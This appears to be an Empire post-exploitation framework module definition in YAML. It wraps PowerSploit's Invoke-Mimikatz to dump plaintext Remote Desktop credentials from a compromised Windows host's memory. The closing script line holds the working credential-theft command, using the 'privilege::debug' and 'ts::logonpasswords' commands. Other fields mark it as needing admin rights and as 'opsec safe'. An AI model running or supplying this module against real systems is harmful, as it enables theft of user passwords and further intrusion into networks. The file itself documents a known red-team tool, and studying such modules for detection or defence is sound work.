name: Invoke-Mimikatz Dump Terminal Server Passwords
authors:
  - '@JosephBialek'
  - '@gentilkiwi'
description: |
  Runs PowerSploit's Invoke-Mimikatz function to extract plaintext RDP credentials from memory.
software: S0002
techniques:
  - T1003
  - T1081
background: true
output_extension:
needs_admin: true
opsec_safe: true
language: powershell
min_language_version: '2'
comments:
  - 'https://github.com/gentilkiwi/mimikatz/releases/tag/2.2.0-20210531'
  - 'https://www.n00py.io/2021/05/dumping-plaintext-rdp-credentials-from-svchost-exe/'
options:
  - name: Agent
    description: Agent to run module on.
    required: true
    value: ''
script_path: 'empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1'
script_end: |
  Invoke-Mimikatz -Command '"privilege::debug" "ts::logonpasswords" "exit"';
